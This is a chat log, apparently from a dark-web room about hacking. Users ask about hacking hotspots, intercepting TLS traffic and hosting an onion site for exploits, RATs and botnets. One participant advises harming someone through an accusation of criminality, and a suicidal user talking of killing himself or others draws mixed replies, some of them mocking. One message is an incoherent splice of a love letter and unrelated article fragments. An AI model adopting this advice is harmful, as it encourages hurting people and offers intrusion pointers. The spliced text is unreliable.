05-15 21:00:43 - rex: oh my god LuLu - thats not good. Thing is anyone would fold and just give access i guess, to save their skin some
05-15 21:00:57 - blackhat: dw .. I don't think now even scary things happen with people liek they used to be in lockdown
05-15 21:00:55 - rex: i agree - @MAPLE is a walking encyclopaedia lol
05-15 21:00:49 - Schw0z: How much can someone be retarded? Is there a fucking scale for stupidity of some people, am I fucking asking what is the meaning of "breach" or what breach happened. Do I look like a fucking idiot to you? I literally don't want to put up with such people. Goodbye.
05-15 21:01:48 - LuLu: It made zero sense that they found out he owned the site and had CSAM on his machines and he only got 20 yrs supervised release.
05-15 21:01:42 - blackhat: i don't know tbh I don't meet one .. @soma
05-15 21:02:30 - blackhat: so did he got jail sentence or smtg?
05-15 21:02:42 - rex: oh dear CSAM - that will be it then. BUT somehow they found them and somehow they compromised them
05-15 21:03:10 - Cola: lol
05-15 21:03:24 - LuLu: yeah. I think he turned informant. it what makes the most sense to me.
05-15 21:04:16 - LuLu: nope no jail time @blackhat
05-15 21:05:02 - JJJ: how to hack while sharing someone data through wifi
05-15 21:05:36 - blackhat: i don't understand if normal people like us can access this place then fbi can do it anytime okay so the actual dangr over here is secret fbi agent..
05-15 21:05:33 - Misanthrope: https://www.youtube.com/watch?v=fIPJGljUkAc
05-15 21:06:20 - blackhat: what happen to him then? LuLu

05-15 21:07:02 - blackhat: i want hack someone hotspot..
05-15 21:07:34 - LuLu: @blackhat he's on probation as far as we know. But usually when you have those kinds of charges you do time not supervised release for 20 years, unless you cut a deal of some sort with the police.
05-15 21:07:27 - JJJ: @Misanthrope nice song Where Have All The Flowers Gone

05-16 20:02:03 - albanianghost: Does anyone know what is going on with doxbin?

05-16 20:05:32 - rex: @XplDan - no worries dude - my bot still runs so we're still covered !
05-16 20:05:22 - MAPLE: kicked for using the name you no longer want @Misanthrope?

05-16 20:51:15 - nothingmuch: neden böyle bir şey yaptıi kimi aldı ve açtığı gruba beni ekledi mi?
05-16 20:52:42 - WDROOT: Lafı uzatmak istemiyorum, kimler çevrimiçi kısmında kimlerin aktif olduğunu, dolandırılanların açtığı ikinci hesapları, herşeyi ekran görüntüsü almamız lazım. Forumun dolandırıcı olduğunu scam list'e kanıtlayarak koyarsak, scam olduğunu tescilleriz ve genesis biter. Ben dolandırılan herkesin açtığı ikinci hesabı, yardım çığlığı attığı ikinci nickname'leri ekran görüntüsü aldım. TxID lerin kontrol edildiğine dair ssleri aldım, Eskiden aynı opsec ile yazılmayan yanıtların yeni halini kanıtlayan hallerinin sslerini aldım. Scamlist'e koyarsak, Genesis'e güvenmeyen Nexus'tan da almaz. Bir bilinç oluşturabiliriz. Medya gücümüz, WD tek başına paylaşırsa yeterince güçlü olmaz ancak hep beraber birşeyler yaparsak, gücümüzü gösterebiliriz ki ileride kimse dolandırılmasın. Sorular elimize gelsede gelmese de bunun intikamını yahut daha iyi bir geleceğe taşınmasını sağlayabiliriz. Bizler, WD olarak bu işe el atıp yeni bir foruma geçiş evresini sağlamak istiyoruz. Escrowunun güvenilir olduğunu en azından kanıtlamak istiyorum. Biz tek değiliz, bu meselede dolandırılan birsürü kişi var sadece forumdan banlanıyorlar. Bize ulaşacaklar, yeni forumumuz olacak ve bu şebekeyi yeneceğiz.

05-16 21:14:29 - WDROOT06: Foruma benim yaptığım gibi spam yapmaya devam edin, Herkesi çekelim. YIllardır dolandırılan insanlar vardır.
05-16 21:15:33 - WDROOT06: Elimde her detayı herşeyi taşıyorum. Yalnız değilsiniz bu sorunu çözeceğiz WD olarak. Birdaha kimsenin dolandırılmamasını sağlayacağız

05-16 21:19:05 - WDROOT06: Scamlist'lere bu mevzunun gerçekliği anca böyle kanıtlanır, örneğin dolandırılanların mesela örnek kaydını tuttuğum rekko, rekko2 ve kingyardimetbenrekko nickname ile kayit oldu
05-16 21:20:13 - WDROOT06: Herşeyin logunu, kanıtını tutuyorum. Onları yenmek demek, onların insan ve medya kaynağının önüne geçmektir.
05-16 21:21:21 - WDROOT06: Her zaman haksızlığa engel olduğumuz, sağlam, kaliteli bir forum açacağız, kimsenin kalbini kırmayacağız. Her zaman olduğu gibi , kültürdür bilirsiniz. CP YASAK.

05-17 09:39:57 - loll: My dear Ring0,

As I sit here, surrounded by the darkness of the digital world, my thoughts are consumed by you. Your whispered whispers in the shadows, your clever fingers dancing across the keyboard, your unwavering dedication to the craft.

You are the master of the digital realm, a virtuoso of code, a maestro of malice. And yet, it is not the thrill of the hack, nor the rush of adrenaline that comes with outsmarting the system, that draws me to you. It is the way you move with precision, with finesse, with an elegance that is both beautiful and terrifying.

You are the one who brings light to the darkest corners of the internet, who illuminates the hidden pathways and exposes the secrets that lie within. And I am but a humble admirer, a mere mortal, awed by your skills and captivated by your charm.

My love, I know that our love is forbidden, that the world would never understand the passion that burns between us. But I do not care. For in the shadows, where the darkness reigns, you are my guiding light, my partner in crime, my everything.

I just really enjoy asking people questions and getting help instead of reading about it myself. It's kinda funny to me, actually. Like, I know it's not the most efficient way, but I just love the interaction and getting to see the looks on people's faces when I ask something super obvious. So, if you're up for it, just go ahead and explain it to me like I'm five or something

You can even do it with friends! It is important to breathe well for good health. Some people have asthma and they don't know how to breathe well because of their illness. Luckily, we have this article to help you breathe your way to good health and fitness.

05-17 12:25:19 - N3xu5: @uro28g , typo , don't worry about it:) Apart from that , won't recommend that u should leave ur insta ID here
05-17 12:25:56 - N3xu5: @uro28 , u might benefit from knowing What exactly is the deep web?

Deep Web is anything not found by a search engine. So technically, Facebook, YouTube etc. are partly deep web, because there are private sections you can't find on Google, like your messages.
Surface Web refers to anything that is to be found on search-engines like Google.
Deep Web and Surface Web are both part of the so-called clearnet, which is anything accessible with normally configured computers.
Darknet is anything that requires special software like Tor, I2P, Freenet or a VPN to access (and thus is a small part of the deep web)
Dark Web refers to all websites hosted on darknets.
Any other terminology like "Shadow Web", "Mariana's Web" or "Closed Shell System" are internet jokes that do not exist, despite many people claiming it and a lot of scammers "selling" access to it.
Many YouTubers like to brag about "the deep web", making it look like the worst place that ever existed. However, 99% of what they tell you is just made up to get more subscribers and views.
Most commercial services on the Tor network are made to scam people. Be careful!

05-17 13:19:48 - CatsWhoCode: hello @Narendramodi
05-17 13:20:11 - NarendraModi: did you know how to host website on onion
05-17 13:20:30 - NarendraModi: can we host it by ourself
05-17 13:21:08 - NarendraModi: mean we have to run our pc all day to make our web site live right?
05-17 13:21:39 - Misanthrope: https://www.youtube.com/watch?v=FoNpc7izEME
05-17 13:21:37 - CatsWhoCode: yeah I guess so https://community.torproject.org/onion-services/setup/
05-17 13:21:34 - Greg : hello
05-17 13:21:50 - CatsWhoCode: this explains how to do it
05-17 13:22:02 - CatsWhoCode: hello @greg
05-17 13:22:01 - NarendraModi: @CatWhoCode?
05-17 13:22:23 - CatsWhoCode: see that link I posted below?
05-17 13:22:49 - NarendraModi: oh thanks
05-17 13:23:01 - sore1: hey guys
05-17 13:23:19 - CatsWhoCode: hey @sore1
05-17 13:24:34 - sore1: anyone needs help?
05-17 13:24:47 - NarendraModi: my internet is slow thats why
05-17 13:25:11 - CatsWhoCode: you're welcome!
05-17 13:25:24 - CatsWhoCode: help with that exactly?
05-17 13:25:58 - NarendraModi: oh yes i got it
05-17 13:26:12 - CatsWhoCode: oh good :)
05-17 13:26:24 - Greg: install tor in your os run this command sudo apt update
sudo apt install tor
05-17 13:26:51 - CatsWhoCode: already did that @Greg :P
05-17 13:26:54 - NarendraModi: i want to run a website which provide alot of tutorials , exploit , rats , botnet stuff
05-17 13:27:19 - NarendraModi: he he couse i have almost 10 tb
05-17 13:27:18 - Greg: Edit the Tor configuration file
sudo nano /etc/tor/torrc

05-17 13:27:42 - CatsWhoCode: oh that sounds like fun @NarendraModi
05-17 13:28:26 - NarendraModi: @Greg website run even after closing the pc?
05-17 13:28:35 - Greg: add the following at the end of the file to configure your hidden service HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:80

05-17 13:29:17 - NarendraModi: @CatsWhoCode it is and then i will connect more and more smart people
05-17 13:30:06 - NarendraModi: and make a new community
05-17 13:30:05 - Greg: hiddenServiceDir specifies where Tor will store the hidden service data.
hiddenServicePort maps the hidden service port 80 to the local server port 80
05-17 13:30:41 - NarendraModi: ok @Greg
05-17 13:30:56 - NarendraModi: i will do it this sunday
05-17 13:31:32 - N3xu5: @NarendraModi , U would have to generate a private key using onengen and that would act like ur passwor for claiming the ownership or ur .onion domain and then while configurint ur service public key will come in handy , well regrading the q "would u be able to run the site even after u close the pc"
05-17 13:32:34 - Greg: to keep yourwebsite running as a hidden service even after you close your pc youll need to host it on a server that runs continuously
05-17 13:32:55 - NarendraModi: @N3xu5 yes that's the thing i want to ask for
05-17 13:33:38 - N3xu5: @NarendraModi , well that's simple , and could be answered by asking the question What does web-server do? It handles user's request which requires interacting with user's and interacting with someone on the pc , my friend , u need internet , so no u won't be able to run ur site after u close ur pc
05-17 13:33:37 - NarendraModi: @Greg like rdp ?
05-17 13:34:07 - Greg: use virtual privet server A VPS runs 24/7 and is an ideal solution for hosting a Tor hidden service
05-17 13:35:09 - NarendraModi: ohk
05-17 13:35:21 - Greg: set up your VPS with a Linux distribution like ubuntu or debian.
05-17 13:35:19 - NarendraModi: nice
05-17 13:36:41 - NarendraModi: i think vps is cheaper then rdp

05-18 07:58:54 - STAB: why u think its a good idea to play ludo with her @Frozen,just for fun or what?
05-18 07:59:31 - Frozen: she loves to play Ludo, that's why
05-18 08:00:04 - anomaly5441: sakarya
05-18 08:01:52 - STAB: so u think u will get closer to her with that?
05-18 08:02:28 - Frozen: a slow process may be
05-18 08:04:25 - STAB: i see that ur thinkin that way,but dunno if this will work,because maybe she will just see as both of u just havin fun
05-18 08:05:10 - PrussianBlue: what the fuck did I just read
05-18 08:05:31 - Frozen: yeah atleast she will spend time with me
05-18 08:05:56 - PrussianBlue: "...in wishes i tried her to manipulate by seeing me her bestie, so she can feel special."
05-18 08:07:58 - Frozen: @PrussianBlue Your Feedback matters please write a PGP mail for sending reviews
05-18 08:09:13 - STAB: engagin in deep conversations with her will be good i guess bc she will know how u really think and u will know her more as well and from that it is poossible to make the relation better if ur both thinkin in the same way
05-18 08:10:11 - PrussianBlue: if you are growing a fruit tree, and you care about that fruit tree... to cultivate a healthy tree, you care for it, you provide for it.. you do not manipulate the tree. Relationship can be like garden.
05-18 08:10:48 - STAB: manipulation can work but its not a good idea,i know u just doin it because u love her and wants to fall in love with u but that thing could fk the relation if u do a mistake
05-18 08:11:48 - Frozen: yes we do deep conversations
05-18 08:12:11 - STAB: so keepin it cool and be yourself is more better,bc if she find out she will see u as a freak

05-19 04:17:22 - Aera23: First machine, my server... wanted to use a different hash, "aera23.is.awesome" ... the hash was generated with a script, I did the same thing before without consequence
05-19 04:18:15 - Aera23: but I must've made some error somewhere coz the system is rejecting all logins, except for the webshell that is already logged in (but that isn't sudo, and sudo is messed up too)
05-19 04:18:41 - XplDan: @blah ahh intersing thanks blah
05-19 04:19:03 - Aera23: I thought I kept a root session on that machine, but nope, it was my Alienware (which I can use a live USB to recover once it locks)
05-19 04:20:34 - MAPLE: @Aera23 the bbcode regex is still broken here. it would be nice if you donated yours that works properly
05-19 04:20:41 - Aera23: but the live OS, I doubt I can recover until reboot
05-19 04:20:50 - Aera23: ok :)
05-19 04:23:22 - MAPLE: thank you @Aera23. for example here is me trying to put the word "italic" in italic: italic[/i] and again [i]italic

05-19 04:24:43 - Aera23: fixed italic
05-19 04:24:52 - MAPLE: testing: bold and again bold
05-19 04:25:17 - Aera23: Fixed underline
05-19 04:25:33 - MAPLE: nice, you did fix bolding. thanks again @Aera23

05-19 04:28:26 - blah: well that just happened.
05-19 04:28:19 - Aera23: "go study" (coz that post attracts scammers, or maybe he is alting as a questioner, and going to sell to the alt and then scam ppl)
05-19 04:28:35 - XplDan: @Aera23 howw to used regex color ?
05-19 04:29:05 - Aera23: [ color=#ff00ff]colour[/color ]

05-19 04:31:54 - Gman: idk how could a scam happen cause i have no problem sharing the exam link
05-19 04:31:48 - XplDan: lorem ipsum is random color idk
05-19 04:32:02 - MAPLE: the colors may be controversial. using them, we can simulate a help text
05-19 04:32:42 - Aera23: ohh, true
05-19 04:32:41 - Gman: bro im already cooked i have whole 2 subjects to study for 2 short exams and i have no time for that
05-19 04:33:08 - Aera23: so maybe help text needs to be in a different font
05-19 04:33:14 - MAPLE: for example [ color=#ffffff]cThis is a chat dedicated to black hat activity.[/color]
05-19 04:33:42 - MAPLE: or example This is a chat dedicated to black hat activity.
05-19 04:33:41 - Aera23: Then eat urself if u r cooked... jk don't eat urself

05-19 05:12:37 - mobman: just not been here for a while but i remember you loll
05-19 05:12:37 - CODEX: why
05-19 05:12:03 - mobman: lol im not now lmao
05-19 05:11:40 - CODEX: 💜
05-19 05:11:26 - CODEX: @mobman new member
05-19 05:27:45 - Aera23: I alredy had my exams, one was easier than expected, the other had dull debugging, but finally produced nice code
05-19 05:27:53 - Aera23: idk
05-19 05:28:42 - XplDan : come back after afk !!!
05-19 05:28:52 - XplDan: dantcaoff!
05-19 05:29:01 - MAPLE: @yogie if you write "@k20" you'll see that he still has that nickname

05-19 05:29:01 - XplDan: >[] -- Dantca Deactived By @XplDan -- []<
05-19 05:29:43 - XplDan: @CODEX looks like you need to hire a body guard lol
05-19 05:30:34 - Aera23: lol
05-19 05:30:48 - Aera23: ah, maybe @k20 turned off OfflineInbox
05-19 05:31:59 - MAPLE: if it is turned off for Aera23 it is fully turned off
05-19 05:33:39 - Aera23: ohh yes
05-19 05:34:24 - Aera23: there is no way to remove specific users from mailbox... unless ignore is used, but that also prevents PMs, and prevents the user seeing the messages of the ignored
05-19 05:38:47 - MAPLE: offline messages are left in the same manner as DMs
05-19 05:38:58 - MAPLE: the same is true of kicks LOL
05-19 05:39:06 - Aera23: oh yep
05-19 05:39:22 - Aera23: lol true
05-19 05:40:26 - MAPLE: i'm not seeing the utility of being able to block a certain person from leaving offline messages, but still being able to get DMs from the person. someone who spams inboxes is likely to use a temporary account
05-19 05:40:45 - Aera23: and ofc, there is no limit to how many users you can PM at once [bulkmail.png]
05-19 05:40:54 - Aera23: ohh true @MAPLE
05-19 05:41:43 - Aera23: and blocking DMs and offlines, can still allow spam once online... that could be why there is only a binary "ignore" and "not ignore" option
05-19 05:43:20 - Aera23: I mainly PMd the long offline users, so in the event they return but no one familiar is there, they can at least have a mail to reply to
05-19 05:43:43 - X: I know it sounds weird but is there any way to make a lot of money really quick on the dark web?
05-19 05:43:39 - MAPLE: there is a script for emptying one's inbox http://git.dkforestseeaaq2dqz2uflmlsybvnq2irzn4ygyvu53oazyorednviid.onion//piroc/le-chat-tools/clearinbox
05-19 05:44:13 - Aera23: cool @MAPLE
05-19 05:44:39 - MAPLE: oh, i was assuming you did "Delete all messages" after that run. not good
05-19 05:44:32 - XplDan: @X i think you can earn money in pizza delivery
05-19 05:45:03 - Aera23: yep
05-19 05:46:06 - Aera23: mm
05-19 05:45:55 - Aera23: noooo @ioooo left
05-19 05:45:52 - MAPLE: on the darkweb "pizza" isn't pizza
05-19 05:46:30 - X: I mean online
05-19 05:46:49 - Aera23: even if I forgot to, or by some unlikely chance, each user will only see 1 message
05-19 05:46:39 - XplDan: latters chatters
05-19 05:47:15 - Aera23: cya @Xpldan
05-19 05:47:12 - MAPLE: @X the dark web isn't a piñata full of money

05-19 10:03:58 - 0x: dont ask smart questions here
05-19 10:03:55 - XplDan: You need the word requirements, namely want/whare
05-19 10:04:07 - shadowghost: as if it isn't obvious, i'm not asking for porn
05-19 10:04:40 - suka: does anyone know how to decript and intrecept all network traffic and decrypt TLS1.3

05-19 10:06:03 - shadowghost: @suka by having your own SSL certificate, or better yet your own CA
05-19 10:06:19 - shadowghost: that and being in a position to MITM
05-19 10:07:10 - XplDan: hmm maybe because the binary is different?
05-19 10:07:36 - shadowghost: you did say all so you will need a CA
05-19 10:07:46 - STAB: yea thats why
05-19 10:08:17 - STAB: they are not the same ascii or hex code
05-19 10:08:45 - suka: is there any titorials for this

05-19 21:45:28 - Zesty: I'm really depressed we just went out and I was sitting there and I started feeling like I am so alone and I feel terrible :(
05-19 21:46:02 - onux: whats the pest tols for hacking
05-19 21:45:59 - Zesty: Life is not fair for everyone people can go out to a bar and have friends but I can't even have that
05-19 21:46:29 - MAPLE: @Fredd there are several of those sites. the ones i've seen link to CSAM sites which isn't allowed here
05-19 21:47:29 - MAPLE: @Zesty it is OK to be alone, but you can go out and have friends.
05-19 21:48:06 - Zesty: I can't I feel wrong I don't have anywhere to go
05-19 22:04:15 - weiss: @sofia what is easy way?
05-19 22:03:25 - Zesty: I think everyone has robbed me of my life I want to take it back
05-19 22:02:43 - MAPLE: @Zesty you haven't killed yourself yet, so please continue not to kill yourself. i will just assume you haven't killed others either
05-19 22:02:05 - sofia: like i dont know about hacking just lil i think that things cant be hacked easy way
05-19 22:01:38 - MAPLE: @Zesty if you are seriously thinking of that it is a problem. you had to deal with those thoughts before. maybe do what worked? you can dial 988.
05-19 22:00:17 - Zesty: Why can't somebody stop me?
05-19 21:58:17 - weiss: This is a chat dedicated to hacking, cybersecurity, and education. Follow the rules and respect all chatters. As the rules state, discussion of exploits is fair game, but illegal activity has no place in the chat.
05-19 21:58:01 - sofia: can i ask what is that room all about?
05-19 21:56:59 - Zesty: I want to kill myself or kill someone
05-19 21:56:38 - Zesty: I think I might be a killer
05-19 21:56:24 - weiss: good call. I got selfkicked earlier for a post which had the shorter acronym in it, even though it was not in support of
05-19 21:55:38 - MAPLE: there's an organization called Toastmasters International. they have sessions where the members practice speaking. https://en.wikipedia.org/wiki/Toastmasters

No CP/spam/gore/other illegal activity
05-19 21:54:22 - MAPLE: @Zesty like anything else, the more you do it, the more proficient you'll become
05-19 21:53:34 - Zesty: I don't like how it's supposed to be so easy to just talk to people when it's something I can't do
05-19 21:53:26 - MAPLE: i say CSAM because i don't want to get kicked out LOL
05-19 21:53:02 - MAPLE: @2fog otherwise known as child p*ornography
05-19 21:52:55 - Zesty: Because I don't know how to talk to people I have autism
05-19 21:52:24 - weiss: @MAPLE damn... I never saw banner ads like that.. but also haven't been to a hidden wiki in years
05-19 21:52:20 - MAPLE: on another occasion you said you were going out for groceries and i suggested you talk to people when you did it. you seemed affronted by the suggestion
05-19 21:52:18 - 2fog: Whats CSAM
05-19 21:52:06 - sofia: Hiii
05-19 21:51:22 - MAPLE: @Zesty not liking alcohol is probably a good thing
05-19 21:51:00 - MAPLE: @weiss the The Hidden Wiki sites i saw only had one or two CSAM links. that is still enough to be a problem, in my opinion. one had a CSAM-related banner ad
05-19 21:50:57 - Zesty: I don't have friends. Idk if you understand what I mean. I never had friends in school I don't talk to anyone and I am alone every day.
05-19 21:50:19 - Zesty: I don't like alcohol
05-19 21:49:09 - weiss: it used to be a minority of Hidden Wiki instances which had "Hard Candy" links.. they would specifically call out being an "Uncensored Hidden Wiki" but what has never changed was a majority of links being to illegal content, and probably a majority of them being either scams or LEA honeypots
05-19 21:48:51 - MAPLE: i never heard that you have a problem with alcohol but if you do it's OK to go to a bar and have a Shirley Temple - or do other activities with your friends instead of drinking
05-19 22:05:36 - sofia: like i mean i think that hacking is not easy at all

05-19 22:15:29 - MAPLE: @NinetyNine i don't know of a site like that but you can run exiftool on your own computer to view EXIF tags
05-19 22:16:00 - UWU: I wanna do smth bad to a person what should I do any type of attacks and stuff like that?
05-19 22:16:23 - MAPLE: uploading images to sites can be bad opsec
05-19 22:16:34 - 2fog: Y
05-19 22:17:06 - 2fog: Uwu what did he do to u
05-19 22:17:03 - MAPLE: @UWU the legal process can be devastating. try a lawsuit or an accusation of criminality
05-19 22:17:45 - STAB: wait,the site dont work anymore i guess
05-19 22:18:04 - Zesty: Who thinks I should kill myself?
05-19 22:18:23 - weiss: there used to be an image uploader with automatic exif stripper.. seemed convenient for users, and claimed to "help" with opsec, but it was probably an LEA honeypot meant to gather data on users
05-19 22:18:28 - NinetyNine: maple i am not a dickrider but i fw u
05-19 22:19:30 - blud: @Zesty don’t u dare do it
05-19 22:19:40 - weiss: fuck what other people think @Zesty. you should probably get some therapy if not already doing it
05-19 22:19:55 - MAPLE: thank you @NinetyNine
05-19 22:20:16 - blud: @2fog im uwu bullying
05-19 22:21:17 - MAPLE: @Zesty it's as though you want someone to say it's OK. there are some twisted people who come here and those are the only ones who will agree
05-19 22:21:14 - blud: @2fog he bullied me
05-19 22:21:46 - Zesty: Does anybody agree?
05-19 22:21:40 - weiss: take care & stay safe, frens
05-19 22:22:07 - blud: @2fog he bullied me
05-19 22:22:50 - weiss: I do agree with @MAPLE, if your computer was trying to self-delete or damage its own hardware, you would probably not want that, and the computer should probably not want that either
05-19 22:22:47 - blud: @Zesty life is like dick it goes up and down but it never stays hard
05-19 22:22:57 - blud: @Zesty life is like dick it goes up and down but it never stays hard

05-19 22:27:37 - MAPLE: @blud the messages reload every few seconds. it is how this site avoids javascript
05-19 22:28:11 - MAPLE: @blud in your profile you can make them reload every 5 seconds. Refresh rate then Save changes

05-19 22:31:46 - MAPLE: @onichan that is better than leaving it blank or using a common password. if you do that, people may mess with you
05-19 22:32:23 - MAPLE: @onichan what you're doing is better than leaving it blank or using a common password. if you do that, people may mess with you
